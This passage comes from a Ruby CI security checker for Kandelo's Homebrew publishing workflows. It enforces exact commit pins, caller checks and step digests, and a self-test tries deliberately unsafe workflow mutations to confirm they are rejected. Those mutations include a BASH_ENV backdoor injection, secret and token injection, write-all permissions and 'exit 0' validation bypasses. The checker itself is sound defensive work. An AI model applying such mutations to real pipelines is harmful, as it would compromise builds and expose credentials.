    'under-lock publisher accepted concurrent dependency recipe drift',
    'under-lock publisher accepted concurrent dependency-edge drift',
    'Formula differs from the planned tap outside canonical bottle metadata',
    'bash "$REPO_ROOT/scripts/test-install-local-binary-sealed.sh"',
    'bash "$REPO_ROOT/scripts/test-homebrew-publisher-real-lifecycle.sh"',
    'bash "$REPO_ROOT/scripts/test-homebrew-validate-host-dependency-plan.sh"',
    'python3 "$REPO_ROOT/scripts/test-prepare-homebrew-recipe-host-runtime.py"',
    'assert_atomic_publication_batch_closes_formula_metadata_wave',
    'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$(make_primary_resolved_tap_map "$tap_root")"',
    'export KANDELO_HOMEBREW_RESOLVED_TAPS_FILE',
    'atomic batch publisher accepted untracked source dirt',
    'atomic batch publisher did not explain untracked source dirt',
    'rejected untracked source dirt changed the tap checkout',
    'single-package publication bypassed the peer Formula/metadata mismatch',
    'failed atomic batch changed the tap checkout',
    'atomic batch metadata did not contain both exact bottle handoffs',
    'deferred whole-tap validation weakened selected bottle evidence',
    'bash "$REPO_ROOT/scripts/test-publish-immutable-github-release.sh"',
    'bash "$REPO_ROOT/scripts/test-publish-homebrew-closed-selection-release.sh"',
    'bash "$REPO_ROOT/scripts/test-homebrew-vfs-release.sh"',
    'assert_publish_handoff_download_topologies',
    'correctly named nested single-publication handoff was not accepted',
    'publication handoff collector accepted mixed flattened and nested layouts',
    'publication handoff collector accepted an extra artifact directory',
    'publication handoff collector accepted an identity outside the planned matrix',
    'publication handoff collector accepted a symlinked payload entry',
    'publication handoff collector wrote its manifest inside untrusted artifact data',
    'failure report did not preserve exact bounded validation stderr',
    'oversized failure detail was not replaced by the bounded omission marker',
    'non-text failure detail was not replaced by the bounded omission marker',
    'failure reporter accepted an oversized summary error',
  ].each do |fragment|
    check(publisher_test_source.include?(fragment),
          "publisher workflow tests do not cover dependency drift: #{fragment}")
  end
  check(!finalize_steps.filter_map { |step| step["run"] }.join("\n").match?(/(?:^|\s)brew(?:\s|$)/) &&
        !finalize_steps.filter_map { |step| step["run"] }.join("\n").include?(
          "homebrew-generate-sidecars-from-env.sh"
        ), "credentialed finalizer evaluates Homebrew or Formula code")
  check(finalize_steps.none? { |step| step["uses"] == UPLOAD_ACTION } &&
        finalize_steps.none? { |step| step["name"].to_s.downcase.include?("diagnostic") },
        "credentialed finalizer publishes diagnostics")

  report_checkout = named_step(finalize_steps,
                               "Checkout clean tap for a failed-attempt report")
  report = named_step(finalize_steps,
                      "Record failed attempt without replacing last-green metadata")
  final_fail = named_step(
    finalize_steps, "Fail after reporting an unsuccessful coordinated publication"
  )
  check(report_checkout["if"] == failure_condition && report["if"] == failure_condition &&
        final_fail["if"] == failure_condition,
        "publisher failed-attempt path changed")
  report_run = report.fetch("run")
  check(report_run.include?('--tap-root "$GITHUB_WORKSPACE/tap-report"') &&
        !report_run.include?("tap-publish") &&
        report_run.include?('validation_error_file="$RUNNER_TEMP/homebrew-finalize-validation-error.txt"') &&
        report_run.include?('publication_error_file="$RUNNER_TEMP/homebrew-finalize-publish-error.txt"') &&
        report_run.include?('[ "$VALIDATE_PAYLOAD_OUTCOME" != "success" ]') &&
        report_run.include?('elif [ "$PUBLISH_OUTCOME" != "success" ]') &&
        report_run.include?('error_detail_file="$validation_error_file"') &&
        report_run.include?('error_detail_file="$publication_error_file"') &&
        report_run.include?('[ -f "$error_detail_file" ] && [ ! -L "$error_detail_file" ]') &&
        report_run.include?('report_args+=(--error-detail-file "$error_detail_file")') &&
        !report_run.match?(/^\s*(?:cat|head|tail|sed)\b/) &&
        report_run.include?('error_text="publish-handoff=$PUBLISH_HANDOFF_OUTCOME; '),
        "publisher failure report does not use a clean checkout and bounded stage diagnostics")

  check(!values_for_key(workflow, "run").join("\n").include?("GITHUB_SHA"),
        "publisher reads an ambient workflow execution SHA")
  check(!JSON.generate(plan).include?("${{ github.sha }}") &&
        values_for_key(plan, "REQUESTED_TAP_SHA") == ["${{ inputs.tap-ref }}"],
        "publisher substitutes workflow execution head for the requested tap source")
  check(contract_digest(plan_steps) == PUBLISHER_PLAN_DIGEST,
        "publisher plan step contract changed")
  check(contract_digest(build_steps) == PUBLISHER_BUILD_DIGEST,
        "publisher build step contract changed")
  check(contract_digest(upload_steps) == PUBLISHER_UPLOAD_DIGEST,
        "publisher upload step contract changed")
  check(contract_digest(index_steps) == PUBLISHER_INDEX_DIGEST,
        "publisher version-index step contract changed")
  check(contract_digest(stage_steps) == PUBLISHER_STAGE_DIGEST,
        "publisher cross-run staging step contract changed")
  check(contract_digest(verify_steps) == PUBLISHER_VERIFY_DIGEST,
        "publisher verification step contract changed")
  check(contract_digest(finalize_steps) == PUBLISHER_FINALIZE_DIGEST,
        "publisher finalization step contract changed")
  check(contract_digest(vfs_release_steps) == PUBLISHER_VFS_RELEASE_DIGEST,
        "publisher VFS release step contract changed")
end

def check_maintenance(workflow)
  top_keys = workflow.keys.map { |key| key == true ? "on" : key.to_s }.sort
  check(top_keys == %w[concurrency jobs name on],
        "maintenance has unexpected top-level configuration")
  check(workflow["name"] == "Reusable Kandelo Homebrew bottle maintenance",
        "maintenance name changed")
  check(workflow["concurrency"] == {
    "group" => "kandelo-homebrew-bottle-maintenance-kandelo-dev-homebrew-tap-core-" \
               "${{ inputs.release-tag || github.run_id }}",
    "cancel-in-progress" => false,
  }, "maintenance concurrency contract changed")

  events = workflow_events(workflow)
  check(events.keys == ["workflow_call"], "maintenance must only expose workflow_call")
  workflow_call = events.fetch("workflow_call")
  check(workflow_call.keys == ["inputs"], "maintenance workflow_call contract changed")
  check(workflow_call["inputs"] == {
    "mode" => { "type" => "string", "default" => "rebuild" },
    "kandelo-ref" => { "type" => "string", "default" => "" },
    "tap-ref" => { "type" => "string", "default" => "" },
    "formulae" => { "type" => "string", "required" => true },
    "arches" => { "type" => "string", "default" => "wasm32" },
    "release-tag" => { "type" => "string", "default" => "" },
    "expected-cache-keys" => { "type" => "string", "default" => "" },
    "package-generation-wasm32" => { "type" => "string", "default" => "" },
    "package-generation-wasm64" => { "type" => "string", "default" => "" },
    "force" => { "type" => "boolean", "default" => false },
    "rollback-reason" => { "type" => "string", "default" => "" },
    "rollback-ref" => { "type" => "string", "default" => "" },
    "deleted-package-url" => { "type" => "string", "default" => "" },
    "deletion-reason" => { "type" => "string", "default" => "" },
  }, "maintenance inputs changed")
  check(!workflow.key?("permissions"), "maintenance requests workflow permissions")
  check_common(workflow, "maintenance workflow")

  jobs = workflow_jobs(workflow)
  check(jobs.keys.sort == %w[rebuild rollback validate], "maintenance has an unexpected job set")
  validate = jobs.fetch("validate")
  rebuild = jobs.fetch("rebuild")
  rollback = jobs.fetch("rollback")
  check(validate.keys.sort == %w[permissions runs-on steps],
        "maintenance validation job changed")
  check(validate["runs-on"] == "ubuntu-latest" && validate["permissions"] == {},
        "maintenance validation authority changed")
  validate_steps = job_steps(validate, "maintenance validate")
  check(contract_digest(validate_steps) == MAINTENANCE_VALIDATE_DIGEST,
        "maintenance validation step contract changed")
  validate_step = named_step(validate_steps, "Validate maintenance mode")
  check(validate_step["env"] == {
    "CALLER_EVENT_NAME" => "${{ github.event_name }}",
    "CALLER_REF" => "${{ github.ref }}",
    "CALLER_REPOSITORY" => "${{ github.repository }}",
    "CALLER_WORKFLOW_REF" => "${{ github.workflow_ref }}",
    "KANDELO_REF" => "${{ inputs.kandelo-ref }}",
    "MODE" => "${{ inputs.mode }}",
    "TAP_REF" => "${{ inputs.tap-ref }}",
  }, "maintenance caller validation mapping changed")
  validate_run = validate_step.fetch("run")
  [
    'normalized_caller_repository="$(printf \'%s\' "$CALLER_REPOSITORY" | tr \'[:upper:]\' \'[:lower:]\')"',
    '[ "$normalized_caller_repository" = "kandelo-dev/homebrew-tap-core" ]',
    '[ "$CALLER_REF" = "refs/heads/main" ]',
    '[ "$CALLER_EVENT_NAME" = "repository_dispatch" ]',
    "maintain-bottles.yml@refs/heads/main",
    "rebuild)",
    '[[ "$KANDELO_REF" =~ ^[0-9a-f]{40}$ ]]',
    "maintenance rebuild requires an exact lowercase 40-character Kandelo commit SHA",
    "rollback)",
    '[[ "$TAP_REF" =~ ^[0-9a-f]{40}$ ]]',
    "maintenance rebuild requires an exact reviewed lowercase 40-character tap commit SHA",
  ].each do |fragment|
    check(validate_run.include?(fragment), "maintenance validation lacks #{fragment}")
  end
  canonical_maintenance = maintenance_validation_result(validate_run)
  check(canonical_maintenance["status"] == 0,
        "maintenance rejects GitHub's canonical lowercase repository identity")
  mixed_case_maintenance = maintenance_validation_result(validate_run, {
    "CALLER_REPOSITORY" => "Kandelo-Dev/Homebrew-Tap-Core",
    "CALLER_WORKFLOW_REF" =>
      "Kandelo-Dev/Homebrew-Tap-Core/.github/workflows/maintain-bottles.yml@refs/heads/main",
  })
  check(mixed_case_maintenance["status"] == 0,
        "maintenance does not normalize the repository portion of caller identity")
  case_variant_maintenance = maintenance_validation_result(validate_run, {
    "CALLER_WORKFLOW_REF" =>
      "kandelo-dev/homebrew-tap-core/.github/workflows/MAINTAIN-BOTTLES.YML@refs/heads/main",
  })
  check(case_variant_maintenance["status"] == 2 &&
        case_variant_maintenance["stdout"].include?(
          "maintenance requires the reviewed tap maintenance workflow"
        ), "maintenance accepts a case-variant workflow path")

  {
    "missing commit" => "",
    "mutable main" => "main",
    "uppercase commit" => "E" * 40,
    "short commit" => "e" * 39,
    "long commit" => "e" * 41,
    "fully qualified commit" => "refs/heads/main",
  }.each do |label, tap_ref|
    rejected = maintenance_validation_result(validate_run, "TAP_REF" => tap_ref)
    check(rejected["status"] == 2 && rejected["stdout"].include?(
            "maintenance rebuild requires an exact reviewed lowercase 40-character tap commit SHA"
          ), "maintenance accepts #{label} as its tap source")
  end
  {
    "missing commit" => "",
    "mutable main" => "main",
    "uppercase commit" => "A" * 40,
    "short commit" => "a" * 39,
    "long commit" => "a" * 41,
    "fully qualified main" => "refs/heads/main",
  }.each do |label, kandelo_ref|
    rejected = maintenance_validation_result(
      validate_run, "KANDELO_REF" => kandelo_ref
    )
    check(rejected["status"] == 2 && rejected["stdout"].include?(
            "maintenance rebuild requires an exact lowercase 40-character Kandelo commit SHA"
          ), "maintenance accepts #{label} as its Kandelo source")
  end
  rollback_validation = maintenance_validation_result(
    validate_run, "MODE" => "rollback", "TAP_REF" => ""
  )
  check(rollback_validation["status"] == 0,
        "maintenance rollback unnecessarily requires a rebuild source commit")

  expected_rebuild_permissions = { "contents" => "write", "packages" => "write", "actions" => "read" }
  check(rebuild.keys.sort == %w[if needs permissions uses with] &&
        rebuild["needs"] == ["validate"] &&
        rebuild["if"] == "${{ inputs.mode == 'rebuild' }}" &&
        exact_permissions?(rebuild["permissions"], expected_rebuild_permissions) &&
        rebuild["uses"] == "./.github/workflows/reusable-homebrew-bottle-publish.yml",
        "maintenance rebuild execution contract changed")
  check(rebuild["with"] == {
    "kandelo-repository" => "Automattic/kandelo",
    "kandelo-ref" => "${{ inputs.kandelo-ref }}",
    "tap-repository" => "kandelo-dev/homebrew-tap-core",
    "tap-name" => "kandelo-dev/tap-core",
    "tap-ref" => "${{ inputs.tap-ref }}",
    "formulae" => "${{ inputs.formulae }}",
    "arches" => "${{ inputs.arches }}",
    "release-tag" => "${{ inputs.release-tag }}",
    "expected-cache-keys" => "${{ inputs.expected-cache-keys }}",
    "package-generation-wasm32" => "${{ inputs.package-generation-wasm32 }}",
    "package-generation-wasm64" => "${{ inputs.package-generation-wasm64 }}",
    "force" => "${{ inputs.force }}",
    "dry-run" => false,
  }, "maintenance rebuild input wiring changed")
  package_write_jobs = jobs.select do |_name, job|
    job.fetch("permissions", {}).fetch("packages", nil) == "write"
  end.keys
  check(package_write_jobs == ["rebuild"] &&
        rebuild["uses"] ==
          "./.github/workflows/reusable-homebrew-bottle-publish.yml",
        "maintenance GHCR writer bypasses the shared publisher lock")

  expected_rollback_permissions = { "contents" => "write", "packages" => "read", "actions" => "read" }
  check(rollback.keys.sort == %w[if needs permissions runs-on steps timeout-minutes] &&
        rollback["needs"] == ["validate"] &&
        rollback["if"] == "${{ inputs.mode == 'rollback' }}" &&
        rollback["runs-on"] == "ubuntu-latest" &&
        rollback["timeout-minutes"] == 30 &&
        exact_permissions?(rollback["permissions"], expected_rollback_permissions),
        "maintenance rollback execution contract changed")
  rollback_steps = job_steps(rollback, "maintenance rollback")
  check(contract_digest(rollback_steps) == MAINTENANCE_ROLLBACK_DIGEST,
        "maintenance rollback step contract changed")
  check(values_for_key(workflow, "uses").sort == [
    "./.github/workflows/reusable-homebrew-bottle-publish.yml",
    CHECKOUT_ACTION,
    CHECKOUT_ACTION,
    NIX_ACTION,
  ].sort, "maintenance action set or pin changed")

  checkouts = rollback_steps.select { |step| step["uses"] == CHECKOUT_ACTION }
  check(checkouts.map { |step| { "name" => step["name"], "with" => step["with"] } } == [
    {
      "name" => "Checkout tap",
      "with" => {
        "repository" => "kandelo-dev/homebrew-tap-core",
        "ref" => "main",
        "path" => "tap",
        "fetch-depth" => 0,
      },
    },
    {
      "name" => "Checkout Kandelo workflow source",
      "with" => {
        "persist-credentials" => false,
        "repository" => "Automattic/kandelo",
        "ref" => "main",
        "path" => "kandelo",
        "submodules" => false,
      },
    },
  ], "maintenance rollback checkout mapping changed")

  record = named_step(rollback_steps, "Record rollback without replacing last-green metadata")
  record_run = record.fetch("run")
  [
    '[[ "$KANDELO_HOMEBREW_FORMULA" =~ ^[a-z0-9][a-z0-9._-]*$ ]]',
    'case "$KANDELO_HOMEBREW_ARCH" in',
    "wasm32|wasm64) ;;",
    '[[ "$KANDELO_HOMEBREW_RELEASE_TAG" =~ ^bottles-abi-v[1-9][0-9]*$ ]]',
    'kandelo_commit="$(git -C "$GITHUB_WORKSPACE/kandelo" rev-parse HEAD)"',
    '--kandelo-commit "$kandelo_commit"',
    '--exact-kandelo-main-sha "$kandelo_commit"',
  ].each do |fragment|
    check(record_run.include?(fragment), "maintenance rollback lacks #{fragment}")
  end
end

def expect_rejection(label)
  rejected = false
  begin
    yield
  rescue KeyError, RuntimeError
    rejected = true
  end
  check(rejected, "self-test accepted #{label}")
end

def mutate_named_step(workflow, job_name, step_name)
  steps = workflow.fetch("jobs").fetch(job_name).fetch("steps")
  step = steps.find { |candidate| candidate["name"] == step_name }
  raise "self-test could not find #{step_name}" unless step
  step
end

def self_test_privileged_recipe_host_runtime(workflows)
  expect_rejection("missing host-runtime preparation") do
    mutated = deep_copy(workflows)
    steps = mutated.fetch(".github/workflows/staging-build.yml")
      .fetch("jobs").fetch("preflight").fetch("steps")
    steps.reject! { |step| step["name"] == HOST_RUNTIME_PREPARATION_STEP }
    check_privileged_recipe_host_runtime(mutated)
  end

  expect_rejection("late host-runtime preparation") do
    mutated = deep_copy(workflows)
    steps = mutated.fetch(
      ".github/workflows/reusable-homebrew-bottle-publish.yml"
    ).fetch("jobs").fetch("build-and-test").fetch("steps")
    preparation_index = steps.index do |step|
      step["name"] == HOST_RUNTIME_PREPARATION_STEP
    end
    preparation = steps.delete_at(preparation_index)
    privileged_index = steps.index do |step|
      step.fetch("run", "").include?("scripts/homebrew-bottle-build.sh")
    end
    steps.insert(privileged_index + 1, preparation)
    check_privileged_recipe_host_runtime(mutated)
  end

  expect_rejection("caller-selected host-runtime preparation") do
    mutated = deep_copy(workflows)
    step = mutate_named_step(
      mutated.fetch(".github/workflows/staging-build.yml"),
      "preflight",
      HOST_RUNTIME_PREPARATION_STEP
    )
    step["run"] = "#{step.fetch('run')} --root /tmp/usr"
    check_privileged_recipe_host_runtime(mutated)
  end

  expect_rejection("conditional host-runtime preparation") do
    mutated = deep_copy(workflows)
    step = mutate_named_step(
      mutated.fetch(".github/workflows/staging-build.yml"),
      "preflight",
      HOST_RUNTIME_PREPARATION_STEP
    )
    step["if"] = "${{ false }}"
    check_privileged_recipe_host_runtime(mutated)
  end

  expect_rejection("ignored host-runtime preparation failure") do
    mutated = deep_copy(workflows)
    step = mutate_named_step(
      mutated.fetch(".github/workflows/staging-build.yml"),
      "preflight",
      HOST_RUNTIME_PREPARATION_STEP
    )
    step["continue-on-error"] = true
    check_privileged_recipe_host_runtime(mutated)
  end

  expect_rejection("undiscovered privileged recipe job") do
    mutated = deep_copy(workflows)
    mutated.fetch(".github/workflows/staging-build.yml")
      .fetch("jobs")["unsealed-recipe"] = {
        "steps" => [
          { "run" => "bash scripts/homebrew-bottle-build.sh" },
        ],
      }
    check_privileged_recipe_host_runtime(mutated)
  end
end

def self_test(publisher, native_compatibility, maintenance,
              first_publication, prefix_first_child)
  fixture = YAML.safe_load(<<~YAML, aliases: false)
    on:
      workflow_dispatch: {}
    permissions: write-all
    jobs:
      unsafe:
        steps:
          - uses: actions/cache/restore@v4
          - run: echo "${{ inputs.formulae }}"
          - uses: actions/checkout@v6
  YAML
  check(workflow_events(fixture).key?("workflow_dispatch"), "self-test missed workflow_dispatch")
  expect_rejection("mutable action and cache state") { check_common(fixture, "fixture") }

  {
    "first publication PAT authentication" => lambda { |w|
      step = mutate_named_step(
        w, "first-publication",
        "Publish one absent repository-rooted child with GITHUB_TOKEN"
      )
      step["run"] = step.fetch("run").sub("--auth-mode github-token", "--auth-mode pat")
    },
    "first publication mutable source" => lambda { |w|
      mutate_named_step(
        w, "first-publication",
        "Checkout exact Kandelo first-publication source"
      )
        .fetch("with")["ref"] = "main"
    },
    "first publication event-selected Formula" => lambda { |w|
      workflow_events(w).fetch("workflow_call").fetch("inputs")["formula"] = {
        "type" => "string", "default" => "zlib",
      }
    },
    "first publication unbound artifact" => lambda { |w|
      mutate_named_step(
        w, "first-publication",
        "Admit protected sources and one completed dry-run child"
      )["run"] = "exit 0"
    },
    "first publication different source run" => lambda { |w|
      mutate_named_step(
        w, "first-publication", "Download exact dry-run OCI child handoff"
      )
        .fetch("with")["run-id"] = 1
    },
    "first publication divergent GHCR writer lock" => lambda { |w|
      w.fetch("concurrency")["group"] =
        "kandelo-homebrew-first-publication-${{ inputs.formula }}"
    },
    "first publication secret injection" => lambda { |w|
      workflow_events(w).fetch("workflow_call")["secrets"] = {
        "TOKEN" => { "required" => true },
      }
    },
  }.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(first_publication)
      mutation.call(mutated)
      check_first_publication(mutated)
    end
  end

  {
    "prefix first-child caller bypass" => lambda { |w|
      mutate_named_step(
        w, "first-child", "Validate exact prefix-campaign caller"
      )["run"] = "exit 0"
    },
    "prefix first-child campaign admission bypass" => lambda { |w|
      mutate_named_step(
        w, "first-child",
        "Require reviewed first-package admission and release"
      )["run"] = "exit 0"
    },
    "prefix first-child ordinary artifact substitution" => lambda { |w|
      step = mutate_named_step(
        w, "first-child", "Download exact bootstrap OCI child"
      )
      step.fetch("with")["name"] = step.fetch("with").fetch("name").sub(
        "prefix-campaign-bootstrap-dry-run-", ""
      )
    },
    "prefix first-child artifact metadata bypass" => lambda { |w|
      mutate_named_step(
        w, "first-child", "Admit two exact same-run bootstrap artifacts"
      )["run"] = "exit 0"
    },
    "prefix first-child ordinary repository transport" => lambda { |w|
      step = mutate_named_step(
        w, "first-child",
        "Publish one absent first child with GITHUB_TOKEN"
      )
      step["run"] = step.fetch("run").sub(
        "repository-bootstrap", "repository"
      )
    },
    "prefix first-child divergent writer lock" => lambda { |w|
      w.fetch("concurrency")["group"] =
        "kandelo-prefix-first-${{ inputs.formula }}"
    },
    "prefix first-child secret injection" => lambda { |w|
      workflow_events(w).fetch("workflow_call")["secrets"] = {
        "TOKEN" => { "required" => true },
      }
    },
  }.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(prefix_first_child)
      mutation.call(mutated)
      check_prefix_first_child(mutated)
    end
  end

  {
    "native lock equality continue-on-error" => lambda { |w|
      mutate_named_step(
        w, "exact-linux-contract", "Require reviewed lock equality"
      )["continue-on-error"] = true
    },
    "native CA validator early success" => lambda { |w|
      step = mutate_named_step(
        w, "exact-linux-contract", "Validate native CA lifecycle evidence"
      )
      step["run"] = "exit 0\n#{step.fetch('run')}"
    },
    "native diagnostic upload before substantive checks" => lambda { |w|
      steps = w.fetch("jobs").fetch("exact-linux-contract").fetch("steps")
      index = steps.index do |step|
        step["name"] == "Retain exact generated Linux lock"
      end
      steps.unshift(steps.delete_at(index))
    },
  }.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(native_compatibility)
      mutation.call(mutated)
      check_native_compatibility_workflow(mutated)
    end
  end

  sidecar_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-generate-sidecars-from-env.sh"))
  fingerprint_source = File.read(File.join(REPO_ROOT, "scripts/homebrew-sysroot-fingerprint.sh"))
  expect_rejection("wasm64 sidecar fingerprint rebound to wasm32") do
    check_sidecar_sysroot_binding(sidecar_source, fingerprint_source.sub(
      'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot64/lib/libc.a" ;;',
      'wasm64) SYSROOT_LIBC="$KANDELO_ROOT/sysroot/lib/libc.a" ;;'
    ))
  end
  expect_rejection("sidecar fingerprint bypasses selected sysroot") do
    check_sidecar_sysroot_binding(sidecar_source.sub(
      'homebrew-sysroot-fingerprint.sh', 'homebrew-ignored-fingerprint.sh'
    ), fingerprint_source)
  end
  expect_rejection("sidecar dependency validation drops checkout identity") do
    check_sidecar_checkout_binding(sidecar_source.sub(
      "  --tap-checkout-commit \"$TAP_CHECKOUT_COMMIT\" \\\n" \
      "  --bottle-root-url",
      "  --bottle-root-url"
    ))
  end

  rootfs_selection_source = File.binread(ROOTFS_PUBLICATION_SELECTION_PATH)
  expect_rejection("rootfs selection omits a reviewed registry bridge") do
    check_rootfs_publication_selection_semantics(rootfs_selection_source.sub(
      "  \"modeset:modeset\"\n", ""
    ))
  end
  expect_rejection("rootfs selection admits an unreviewed registry bridge") do
    check_rootfs_publication_selection_semantics(rootfs_selection_source.sub(
      "  \"nethack:nethack\"\n",
      "  \"nethack:nethack\"\n  \"legacy:legacy\"\n"
    ))
  end
  expect_rejection("rootfs selection bypasses VFS exclusion") do
    check_rootfs_publication_selection_semantics(rootfs_selection_source.sub(
      '[ "$REQUIRE_VFS_ACCEPTANCE" = "false" ]',
      "true"
    ))
  end
  # WHY: both mutations retain all semantic fragments above. They prove the
  # complete-byte binding rejects fail-open control-flow changes which a
  # fragment inventory cannot recognize.
  expect_rejection("rootfs selection exits before validation") do
    check_rootfs_publication_selection(rootfs_selection_source.sub(
      'normalized_formulae="$(normalize_selection "$FORMULAE")"',
      "exit 0\n\nnormalized_formulae=\"$(normalize_selection \"$FORMULAE\")\""
    ))
  end
  expect_rejection("rootfs selection allows every Formula by default") do
    check_rootfs_publication_selection(rootfs_selection_source.sub(
      "bridge_allowed() {\n",
      "bridge_allowed() {\n  return 0\n"
    ))
  end

  publisher_mutations = {
    "top-level environment injection" => lambda { |w| w["env"] = { "BASH_ENV" => "/tmp/backdoor" } },
    "workflow write permission" => lambda { |w| w["permissions"] = "write-all" },
    "direct dispatch" => lambda { |w| workflow_events(w)["workflow_dispatch"] = {} },
    "extra publisher input" => lambda { |w|
      workflow_events(w).fetch("workflow_call").fetch("inputs")["command"] = {
        "type" => "string", "default" => "true",
      }
    },
    "extra publisher secret" => lambda { |w|
      workflow_events(w).fetch("workflow_call")["secrets"] = {
        "UNREVIEWED_TOKEN" => { "required" => false },
      }
    },
    "package secret reaches finalizer" => lambda { |w|
      step = mutate_named_step(
        w, "finalize-tap", "Atomically compose and publish all sidecars under one tap state lock"
      )
      step.fetch("env")["GH_TOKEN"] = "${{ secrets.UNREVIEWED_TOKEN }}"
    },
    "caller feature branch" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "caller publishes another repository" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        '[ "$normalized_caller_repository" = "$normalized_tap_repository" ]', "true"
      )
    },
    "nonconventional third-party tap repository" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        '^[a-z0-9_.-]+/homebrew-[a-z0-9_.-]+$',
        '^[a-z0-9_.-]+/[a-z0-9_.-]+$'
      )
    },
    "repository and Homebrew tap identity mismatch" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        '[ "$normalized_tap_name" = "${tap_owner}/${tap_short_name}" ]', "true"
      )
    },
    "caller workflow rebound to first-party repository" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").gsub(
        '$CALLER_REPOSITORY/.github/workflows/',
        'kandelo-dev/homebrew-tap-core/.github/workflows/'
      )
    },
    "dry-run feature workflow" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub("dry-run-bottles.yml@refs/heads/main",
                                           "feature.yml@refs/heads/feature")
    },
    "wrong caller event" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step.fetch("env")["CALLER_EVENT_NAME"] = "push"
    },
    "write Kandelo source exact-ref validation bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        'validated_kandelo_ref="$(normalize_write_kandelo_ref "$KANDELO_REF")"',
        'validated_kandelo_ref="$KANDELO_REF"'
      )
    },
    "write wasm32 package generation omitted" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step.fetch("env")["PACKAGE_GENERATION_WASM32"] = ""
    },
    "write package generation architecture check bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        "normalize_package_generation wasm64 \"$PACKAGE_GENERATION_WASM64\"",
        "printf '%s\\n' \"$PACKAGE_GENERATION_WASM64\""
      )
    },
    "campaign per-architecture preparation omits architecture" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test",
        "Prepare sealed campaign Formula dependencies"
      )
      step["run"] = step.fetch("run").sub(
        '--arch "$ARCH"', '--target "$ARCH"'
      )
    },
    "campaign preparation substitutes checkout for public source" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test",
        "Prepare sealed campaign Formula dependencies"
      )
      step["run"] = step.fetch("run").sub(
        '--source-tap-commit "$TAP_SHA"',
        '--source-tap-commit "$KANDELO_HOMEBREW_PREPARED_TAP_COMMIT"'
      )
    },
    "build handoff conflates prepared checkout with public source" => lambda { |w|
      step = mutate_named_step(w, "build-and-test",
                               "Create strict bottle data handoff")
      step["run"] = step.fetch("run").sub(
        '"${KANDELO_HOMEBREW_PREPARED_TAP_COMMIT:-' \
        '$KANDELO_HOMEBREW_TAP_COMMIT}"',
        '"$KANDELO_HOMEBREW_TAP_COMMIT"'
      )
    },
    "exact-main admission uses a commit lookup instead of protected main" => lambda { |w|
      step = mutate_named_step(w, "plan", "Admit exact Kandelo main source")
      step["run"] = step.fetch("run").sub(
        '"/repos/$KANDELO_REPOSITORY/git/ref/heads/main"',
        '"/repos/$KANDELO_REPOSITORY/commits/$KANDELO_SHA"'
      )
    },
    "exact-main identity comparison bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Admit exact Kandelo main source")
      step["run"] = step.fetch("run").sub(
        '[ "$KANDELO_SHA" = "$current_main_sha" ]', "true"
      )
    },
    "Kandelo checkout differs from admitted main" => lambda { |w|
      step = mutate_named_step(w, "plan", "Resolve source commits")
      step["run"] = step.fetch("run").sub(
        '[ "$kandelo_sha" != "$REQUESTED_KANDELO_SHA" ]', "false"
      )
    },
    "write tap source exact-ref validation bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        'validated_tap_ref="$(normalize_write_tap_ref "$TAP_REF")"',
        'validated_tap_ref="$TAP_REF"'
      )
    },
    "rootfs dry-run evidence bypass" => lambda { |w|
      step = mutate_named_step(w, "plan", "Validate caller trust boundary")
      step["run"] = step.fetch("run").sub(
        '[ "$validated_generation_kind" = "rootfs-wasm32" ]',
        "false"
      )
    },
    "write tap source selected from workflow execution head" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Bind write tap source to protected main history"
      )
      step.fetch("env")["REQUESTED_TAP_SHA"] = "${{ github.sha }}"
    },
    "protected-main tap ancestry bypass" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Bind write tap source to protected main history"
      )
      step["run"] = step.fetch("run").sub(
        '"/repos/$TAP_REPOSITORY/compare/$TAP_SHA...main"',
        '"/repos/$TAP_REPOSITORY/commits/$TAP_SHA"'
      )
    },
    "required VFS acceptance selection accepted as absent during planning" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step["run"] = step.fetch("run").sub(
        "::error::this invocation requires dependency-bearing VFS acceptance",
        "::notice::this invocation omits dependency-bearing VFS acceptance"
      ).sub("exit 1", "exit 0")
    },
    "campaign legacy VFS planning reenabled" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step.delete("if")
    },
    "dangling VFS acceptance config treated as absent during planning" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step["run"] = step.fetch("run").sub(
        '[ ! -e "$config_candidate" ] && [ ! -L "$config_candidate" ]',
        '[ ! -e "$config_candidate" ]'
      )
    },
    "VFS acceptance Brewfile symlink accepted during planning" => lambda { |w|
      step = mutate_named_step(
        w, "plan", "Validate dependency-bearing VFS acceptance selection"
      )
      step["run"] = step.fetch("run").sub(
        '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
